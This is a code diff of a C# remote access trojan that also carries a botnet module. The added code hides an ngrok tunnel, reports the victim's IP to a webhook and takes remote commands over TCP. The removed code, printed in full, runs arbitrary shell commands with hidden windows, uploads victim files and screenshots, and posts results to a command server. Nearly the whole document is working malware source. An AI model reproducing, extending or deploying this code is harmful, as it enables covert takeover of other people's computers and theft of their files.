@@ -10,7 +10,9 @@ using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
+using System.IO.Compression;
 using System.Net;
+using System.Net.Sockets;
 using System.Reflection.Metadata;
 using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
@@ -25,89 +27,72 @@ public class Program
     //debug setting
 
     //end
-    public static void Main(string[] args)
-    {
-        //debug
 
-        //end
-        AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(CatchError);
-        AsyncMain();
-        Tools.Wait();
-    }
-    private static async void AsyncMain()
+    public static async Task Main(string[] args)
     {
-        //setup
-        bool WiFi = S1l14lx3.CheckWiFi();
-        while (!WiFi)
+        try
         {
-            WiFi = S1l14lx3.CheckWiFi();
-            Thread.Sleep(10000);
-        }
-        bool Server = false;
-        while (!Server)
-        {
-            string res = await S1l14lx3_Module.RAW_POST(Import.ServerURL, "wake");
-            if (res == "wake")
+            //setup
+            if (!File.Exists(Import.Dir + "Tunnel.exe"))
             {
-                Server = true;
-                break;
+                S1l14lx3_Module.FILE_GET("https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip", Import.Dir + @"Tunnel.zip");
+                ZipFile.ExtractToDirectory(Import.Dir + @"Tunnel.zip", Import.Dir + @"Tunnel\");
+                File.Move(Import.Dir + @"Tunnel\ngrok.exe", Import.Dir + @"Tunnel.exe");
+                Directory.Delete(Import.Dir + @"Tunnel\",true);
             }
-            Console.WriteLine("Server is invalid");
-            await Task.Delay(1000 * 60 * 1 / 2);
-        }
-        string chid = S1l14lx3_Module.GETID();
-        string wh = S1l14lx3_Module.GETWH();
-        string encodedWH = "";
-        if (chid != null && chid != "Error" && chid != "")
-        {
-            Import.ID = chid;
-        }
-        else
-        {
-            string ID;
-            var characters = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
-            var Charsarr = new char[7];
-            var random = new Random();
-            for (int i = 0; i < Charsarr.Length; i++)
+            bool WiFi = S1l14lx3.CheckWiFi();
+            while (!WiFi)
             {
-                Charsarr[i] = characters[random.Next(characters.Length)];
+                WiFi = S1l14lx3.CheckWiFi();
+                Thread.Sleep(10000);
             }
-            var resultString = new String(Charsarr);
-            ID = resultString;
-            Import.ID = ID;
-            Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "ID", ID);
-        }
-        if (wh != null && wh != "Error" && wh != "")
-        {
-            byte[] compressedData = Convert.FromBase64String(wh);
-            string decompressedData = Tools.DecompressData(compressedData);
-            Import.Webhook = decompressedData;
-        }
-        else
-        {
-            encodedWH = await S1l14lx3_Module.ADD_POST(Import.ID);
-            await S1l14lx3_Module.DATA_POST($"{Import.ID}:Created new user {Import.ID}.\nPlease set command.");
-            while (encodedWH == "" || encodedWH == null || encodedWH == "null" || encodedWH == "Null")
+            string id = S1l14lx3_Module.GETID();
+            string wh = S1l14lx3_Module.GETWH();
+            string cID = S1l14lx3_Module.GETCID();
+
+            if (id == "Error" || id == "" || wh == "Error" || wh == "" || cID == "Error" || cID == "")
             {
-                encodedWH = S1l14lx3_Module.GET("/wh/" + Import.ID);
+                var characters = "qwertyuiopasdfghjklzxcvbnm1234567890";
+                var Charsarr = new char[8];
+                var random = new Random();
+                for (int i = 0; i < Charsarr.Length; i++)
+                {
+                    Charsarr[i] = characters[random.Next(characters.Length)];
+                }
+                var resultString = new String(Charsarr);
+                Import.ID = resultString;
+                Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "ID", resultString);
+                //channel setting
+                string ResJson = await S1l14lx3_Module.ChannelCreate();
+                var dynajson = DynaJson.JsonObject.Parse(ResJson);
+                Import.ChannelID = dynajson.id;
+                Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "cID", dynajson.id);
+                ResJson = await S1l14lx3_Module.WebhookCreate();
+                dynajson = DynaJson.JsonObject.Parse(ResJson);
+                Import.Webhook = dynajson.url;
+                Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "Webhook", Tools.XOREncode(dynajson.url, Encoding.UTF8.GetBytes(Import.ID)[1]));
+                await S1l14lx3_Module.WEBHOOK_POST($"UserAdded : ```{Import.ID}```");
+                await S1l14lx3_Module.WEBHOOK_POST($"UserID : ```{Import.ID}```");
+                await S1l14lx3_Module.WEBHOOK_POST($"Webhook : ```{Import.Webhook}```");
             }
-            Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "Webhook", encodedWH);
-            byte[] compressedData = Convert.FromBase64String(encodedWH);
-            string decompressedData = Tools.DecompressData(compressedData);
-            Import.Webhook = decompressedData;
+            else
+            {
+                Import.ID = id;
+                Import.Webhook = Tools.XORDecode(wh, Encoding.UTF8.GetBytes(Import.ID)[1]);
+                Import.ChannelID = cID;
+            }
+            //remote access start
+            S1l14lx3.RunMain = true;
+            S1l14lx3.RunSub = true;
+            S1l14lx3.MainThread.Start();
+            //S1l14lx3.SubThread.Start();
+
+            Tools.Wait();
         }
-        //remote access start
-        S1l14lx3.RunMain = true;
-        S1l14lx3.MainThread.Start();
-        S1l14lx3.SubThread.Start();
-    }
-    private static async void CatchError(object sender, UnhandledExceptionEventArgs e)
-    {
-        Exception ex = (Exception)e.ExceptionObject;
-        DateTime dt = DateTime.Now;
-        File.WriteAllText(Import.Dir + @"\Error." + dt.Date.ToString("yyyy-MM-dd_") + $"{dt.Hour}-{dt.Minute}-{dt.Second}" + ".txt", ex.Message);
-        await S1l14lx3_Module.DATA_POST(ex.Message);
-        Environment.Exit(0);
+        catch (Exception ex)
+        {
+            await S1l14lx3_Module.WEBHOOK_POST($"System Error```{ex.Message}```");
+        }
     }
 }
 public class S1l14lx3
@@ -117,17 +102,59 @@ public class S1l14lx3
     public static Thread ModuleThread;
     public static bool RunMain = true;
     public static bool RunSub = true;
+    public static int MainPort = 59183;
+    public static int SubPort = 59182;
+    public static IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
+    public static TcpListener serverSocket = new TcpListener(ipAddress, MainPort);
+    public static TcpListener SubserverSocket = new TcpListener(ipAddress, SubPort);
+    public static TcpClient clientSocket;
+    public static NetworkStream networkStream;
+    public static TcpClient SubclientSocket;
+    public static NetworkStream SubnetworkStream;
 
     public static async void MAIN_THREAD()
     {
-        if (Import.ID == "" || Import.ID == null)
-        {
-            Import.ID = S1l14lx3_Module.GETID();
-        }
+        Process Fprocess = new Process();
+        Fprocess.StartInfo.FileName = Import.Dir + @"Tunnel.exe";
+        Fprocess.StartInfo.Arguments = $"config add-authtoken {Import.NGROKTOKEN}";
+        Fprocess.StartInfo.CreateNoWindow = true;
+        Fprocess.StartInfo.UseShellExecute = false;
+        Fprocess.StartInfo.RedirectStandardOutput = true;
+        Fprocess.Start();
+        Fprocess.WaitForExit();
+
+        Process process = new Process();
+        process.StartInfo.FileName = Import.Dir + @"Tunnel.exe";
+        process.StartInfo.Arguments = "tcp 59183";
+        process.StartInfo.CreateNoWindow = true;
+        process.StartInfo.UseShellExecute = false;
+        process.StartInfo.RedirectStandardOutput = true;
+        process.Start();
+
+        string externalIpString = new WebClient().DownloadString("https://ipinfo.io/ip");
+        var externalIp = IPAddress.Parse(externalIpString);
+
+        await S1l14lx3_Module.WEBHOOK_POST("Process started \\n# [Ngrok dashboard](https://dashboard.ngrok.com/tunnels/agents)");
+        await S1l14lx3_Module.WEBHOOK_POST($"Client IP : ```{externalIp}```");
+
+        serverSocket.Start();
+        clientSocket = serverSocket.AcceptTcpClient();
+        networkStream = clientSocket.GetStream();
+
+        // メッセージを返信
+        /*/
+        byte[] messageBytes = Encoding.UTF8.GetBytes("{CONTENT}");
+        networkStream.Write(messageBytes, 0, messageBytes.Length);
+        /*/
+
         string BeforeCMD = "";
         while (RunMain)
         {
-            string GetCommand = S1l14lx3_Module.GET("/cmd/" + Import.ID);
+            //listen
+            byte[] buffer = new byte[1024];
+            int bytesRead = networkStream.Read(buffer, 0, buffer.Length);
+            string GetCommand = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+
             if (GetCommand == "Error")
             {
                 continue;
@@ -150,10 +177,7 @@ public class S1l14lx3
             {
                 continue;
             }
-            if (data.Roop == false)
-            {
-                BeforeCMD = GetCommand;
-            }
+            BeforeCMD = GetCommand;
             switch (Command[0])
             {
                 //Windows Command Prompt
@@ -191,9 +215,28 @@ public class S1l14lx3
                     ModuleThread = new Thread(S1l14lx3_Module.BEEP);
                     ModuleThread.Start(Command);
                     break;
+                //Debug
+                case "?":
+                    Console.WriteLine(await S1l14lx3_Module.WEBHOOK_POST("生きてるよ (debug用)"));
+                    byte[] messageBytes = Encoding.UTF8.GetBytes("Online");
+                    networkStream.Write(messageBytes, 0, messageBytes.Length);
+                    break;
+                /*/TCP console (没)
+                case "console":
+                    ModuleThread = new Thread(S1l14lx3_Module.CONSOLE);
+                    ModuleThread.Start(Command);
+                    break;
+                /*/
+                //Stop
+                case "stop":
+                    ModuleThread.Abort();
+                    break;
                 //Exit
                 case "exit":
-                    await S1l14lx3_Module.DATA_POST($"プログラムを終了しました\nID : ```{Import.ID}```");
+                    networkStream.Close();
+                    clientSocket.Close();
+                    serverSocket.Stop();
+                    await S1l14lx3_Module.WEBHOOK_POST($"プログラムを終了しました\nID : ```{Import.ID}```");
                     Environment.Exit(0);
                     break;
                 //Default
@@ -206,21 +249,53 @@ public class S1l14lx3
                         break;
                     /*/
             }
-            await Task.Delay(10);
         }
     }
     public static async void SUB_THREAD()
     {
+        Process Fprocess = new Process();
+        Fprocess.StartInfo.FileName = Import.Dir + @"Tunnel.exe";
+        Fprocess.StartInfo.Arguments = $"config add-authtoken {Import.NGROKTOKEN}";
+        Fprocess.StartInfo.CreateNoWindow = true;
+        Fprocess.StartInfo.UseShellExecute = false;
+        Fprocess.StartInfo.RedirectStandardOutput = true;
+        Fprocess.Start();
+        Fprocess.WaitForExit();
+
+        Process process = new Process();
+        process.StartInfo.FileName = Import.Dir + @"Tunnel.exe";
+        process.StartInfo.Arguments = "tcp 59182";
+        process.StartInfo.CreateNoWindow = true;
+        process.StartInfo.UseShellExecute = false;
+        process.StartInfo.RedirectStandardOutput = true;
+        process.Start();
+
+        await S1l14lx3_Module.WEBHOOK_POST("Process started \\n # [Ngrok dashboard](https://dashboard.ngrok.com/tunnels/agents)");
+
+        serverSocket.Start();
+        clientSocket = serverSocket.AcceptTcpClient();
+        networkStream = clientSocket.GetStream();
+
+        // メッセージを返信
+        /*/
+        byte[] messageBytes = Encoding.UTF8.GetBytes("{CONTENT}");
+        networkStream.Write(messageBytes, 0, messageBytes.Length);
+        /*/
+
         string BeforeCMD = "";
-        while (RunSub)
+        while (RunMain)
         {
-            string GetCommand = S1l14lx3_Module.GET("/cmd/ALL");
+            //listen
+            byte[] buffer = new byte[1024];
+            int bytesRead = networkStream.Read(buffer, 0, buffer.Length);
+            string GetCommand = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+
             if (GetCommand == "Error")
             {
                 continue;
             }
             string[] Command = { };
-            ALLRemoteCommand data = JsonConvert.DeserializeObject<ALLRemoteCommand>(GetCommand);
+            RemoteCommand data = JsonConvert.DeserializeObject<RemoteCommand>(GetCommand);
             if (data == null)
             {
                 continue;
@@ -237,10 +312,7 @@ public class S1l14lx3
             {
                 continue;
             }
-            if (data.Roop == false)
-            {
-                BeforeCMD = GetCommand;
-            }
+            BeforeCMD = GetCommand;
             switch (Command[0])
             {
                 //Windows Command Prompt
@@ -268,11 +340,6 @@ public class S1l14lx3
                     ModuleThread = new Thread(S1l14lx3_Module.DFL);
                     ModuleThread.Start(Command);
                     break;
-                //BotNet Module start
-                case "bnms":
-                    ModuleThread = new Thread(S1l14lx3_Module.BNMs);
-                    ModuleThread.Start(Command);
-                    break;
                 //Toast Message
                 case "message":
                     ModuleThread = new Thread(S1l14lx3_Module.TOAST);
@@ -283,16 +350,39 @@ public class S1l14lx3
                     ModuleThread = new Thread(S1l14lx3_Module.BEEP);
                     ModuleThread.Start(Command);
                     break;
+                //Bot Net Module start
+                case "bnms":
+                    ModuleThread = new Thread(S1l14lx3_Module.BNMs);
+                    ModuleThread.Start(Command);
+                    break;
+                //Debug
+                case "?":
+                    Console.WriteLine(await S1l14lx3_Module.WEBHOOK_POST("生きてるよ (debug用)"));
+                    byte[] messageBytes = Encoding.UTF8.GetBytes("Online");
+                    networkStream.Write(messageBytes, 0, messageBytes.Length);
+                    break;
+                //Stop
+                case "stop":
+                    ModuleThread.Abort();
+                    break;
                 //Exit
                 case "exit":
-                    await S1l14lx3_Module.DATA_POST($"プログラムを終了しました\nID : ```{Import.ID}```");
+                    networkStream.Close();
+                    clientSocket.Close();
+                    serverSocket.Stop();
+                    await S1l14lx3_Module.WEBHOOK_POST($"プログラムを終了しました\nID : ```{Import.ID}```");
                     Environment.Exit(0);
                     break;
                 //Default
                 default:
                     continue;
+                    /*/
+                       //Comment
+                    case "CMD":
+                        //Code
+                        break;
+                    /*/
             }
-            await Task.Delay(10);
         }
     }
     public static bool CheckWiFi()
@@ -304,252 +394,6 @@ public class S1l14lx3
         else
         {
             return false;
-        }
-    }
-}
-public class S1l14lx3_Module
-{
-    static string Dir = Directory.GetCurrentDirectory();
-    //command module
-    public static async void WCP(object Obj)
-    {
-        string[] CMD = (string[])Obj;
-        Console.WriteLine(CMD[1]);
-        ProcessStartInfo psi = new ProcessStartInfo();
-        psi.FileName = "cmd";
-        psi.Arguments = "/c " + CMD[1];
-        psi.RedirectStandardOutput = true;
-        psi.RedirectStandardError = true;
-        psi.UseShellExecute = false;
-        psi.CreateNoWindow = true;
-        Process process = new Process();
-        process.StartInfo = psi;
-        process.Start();
-        var SOutput = process.StandardOutput.ReadToEnd();
-        var SError = process.StandardError.ReadToEnd();
-        await DATA_POST($"```Exit Code : {process.ExitCode}\nStandardOutput :\n{SOutput}\nStandardError :\n{SError}```");
-    }
-    public static async void SCC(object Obj)
-    {
-        Process p = Process.Start(Dir + @"\SCC.exe");
-        p.WaitForExit();
-        await PNG_POST(@"C:\Windows\Temp\TSCS");
-    }
-    public static async void UPLOAD(object Obj)
-    {
-        string[] CMD = (string[])Obj;
-        await FILE_POST(CMD[1]);
-    }
-    public static async void DOWNLOAD(object Obj)
-    {
-        string[] CMD = (string[])Obj;
-        string[] raw = CMD[1].Split(" ");
-        string FileURL = raw[0];
-        string Filepath = raw[1];
-        FILE_GET(FileURL, Filepath);
-        await DATA_POST("ダウンロードが完了しました\n" + Filepath);
-    }
-    public static async void DFL(object Obj)
-    {
-        string[] CMD = (string[])Obj;
-        ProcessStartInfo psi = new ProcessStartInfo();
-        psi.FileName = "cmd";
-        psi.Arguments = "/c dir " + CMD[1];
-        psi.RedirectStandardOutput = true;
-        psi.RedirectStandardError = true;
-        psi.UseShellExecute = false;
-        psi.CreateNoWindow = true;
-        Process process = new Process();
-        process.StartInfo = psi;
-        process.Start();
-        var SOutput = process.StandardOutput.ReadToEnd();
-        var SError = process.StandardError.ReadToEnd();
-        await DATA_POST($"```Exit Code : {process.ExitCode}\nStandardOutput :\n{SOutput}\nStandardError :\n{SError}```");
-    }
-    public static void TOAST(object Obj)
-    {
-        string[] CMD = (string[])Obj;
-        Tools.ShowToast(CMD[1]);
-    }
-    public static void BEEP(object Obj)
-    {
-        string[] CMD = (string[])Obj;
-        string[] Opt = CMD[1].Split(' ');
-        Console.Beep(int.Parse(Opt[0]), int.Parse(Opt[1]));
-    }
-    public static async void BNMs(object Obj)
-    {
-        await DATA_POST($"BotNetを起動しました");
-        BNM.Start();
-    }
-    //end
-    public static string GETID()
-    {
-        try
-        {
-            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("s1l14lx3"))
-            {
-                object value = key.GetValue("ID");
-                if (value == null)
-                {
-                    return "Error";
-                }
-                return value.ToString();
-            }
-        }
-        catch
-        {
-            return "Error";
-        }
-    }
-    public static string GETWH()
-    {
-        try
-        {
-            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("s1l14lx3"))
-            {
-                object value = key.GetValue("Webhook");
-                if (value == null)
-                {
-                    return "Error";
-                }
-                return value.ToString();
-            }
-        }
-        catch
-        {
-            return "Error";
-        }
-    }
-    public static async Task<string> FILE_POST(string filepath)
-    {
-        using (var con = new MultipartFormDataContent())
-        {
-            HttpClient client = new HttpClient();
-            byte[] fileBytes = File.ReadAllBytes(filepath);
-            con.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(filepath));
-            HttpResponseMessage response = await client.PostAsync(new Uri(Import.Webhook), con);
-            return await response.Content.ReadAsStringAsync();
-        }
-    }
-    public static async Task<string> PNG_POST(string filepath)
-    {
-        using (var con = new MultipartFormDataContent())
-        {
-            HttpClient client = new HttpClient();
-            byte[] fileBytes = File.ReadAllBytes(filepath);
-            con.Add(new ByteArrayContent(fileBytes), "png", "SCC.png");
-            HttpResponseMessage response = await client.PostAsync(new Uri(Import.Webhook), con);
-            return await response.Content.ReadAsStringAsync();
-        }
-    }
-    public static async Task<string> ADD_POST(string id)
-    {
-        string cnt;
-        using (HttpClient httpClient = new HttpClient())
-        {
-            StringContent content = new StringContent($"s1l14lx3:add:{id}", Encoding.UTF8, "text/plain");
-            HttpResponseMessage response = await httpClient.PostAsync(Import.ServerURL, content);
-            cnt = await response.Content.ReadAsStringAsync();
-        }
-        return cnt;
-    }
-    public static async Task<string> RAW_POST(string URL, string raw)
-    {
-        string cnt;
-        using (HttpClient httpClient = new HttpClient())
-        {
-            StringContent content = new StringContent(raw, Encoding.UTF8, "text/plain");
-            HttpResponseMessage response = await httpClient.PostAsync(URL, content);
-            cnt = await response.Content.ReadAsStringAsync();
-        }
-        return cnt;
-    }
-    public static async Task<string> ALLLOG_POST(string Data)
-    {
-        try
-        {
-            string cnt;
-            using (HttpClient httpClient = new HttpClient())
-            {
-                StringContent content = new StringContent($"s1l14lx3:alllog:{Data}", Encoding.UTF8, "text/plain");
-                HttpResponseMessage response = await httpClient.PostAsync(Import.ServerURL, content);
-                cnt = await response.Content.ReadAsStringAsync();
-            }
-            return cnt;
-        }
-        catch
-        {
-            return "Error";
-        }
-    }
-    public static async Task<string> DATA_POST(string Data)
-    {
-        try
-        {
-            string cnt;
-            using (HttpClient httpClient = new HttpClient())
-            {
-                StringContent content = new StringContent($"s1l14lx3:data:{Import.ID}:{Data}", Encoding.UTF8, "text/plain");
-                HttpResponseMessage response = await httpClient.PostAsync(Import.ServerURL, content);
-                cnt = await response.Content.ReadAsStringAsync();
-            }
-            return cnt;
-        }
-        catch
-        {
-            return "Error";
-        }
-    }
-    public static string TEXT_GET(string URL)
-    {
-        try
-        {
-            using (HttpClient httpClient = new HttpClient())
-            {
-                WebClient web = new WebClient();
-                return web.DownloadString(URL);
-            }
-        }
-        catch (Exception ex)
-        {
-            return "Error : " + ex.Message;
-        }
-    }
-    public static string FILE_GET(string URL, string Filepath)
-    {
-        try
-        {
-            WebClient wc = new WebClient();
-            wc.DownloadFile(URL, Filepath);
-            wc.Dispose();
-            return "Succes";
-        }
-        catch (Exception ex)
-        {
-            return "Error : " + ex.Message;
-        }
-    }
-    public static string GET(string URL)
-    {
-        try
-        {
-            using (HttpClient httpClient = new HttpClient())
-            {
-                WebClient web = new WebClient();
-                string raw = web.DownloadString(Import.ServerURL + URL);
-                string contentType = web.ResponseHeaders["Content-Type"];
-                bool isTextPlain = contentType != null && contentType.StartsWith("text/plain");
-                if (!isTextPlain)
-                {
-                    raw = "Error";
-                }
-                return raw;
-            }
-        }
-        catch(Exception ex)
-        {
-            return "Error";
         }
     }
 }
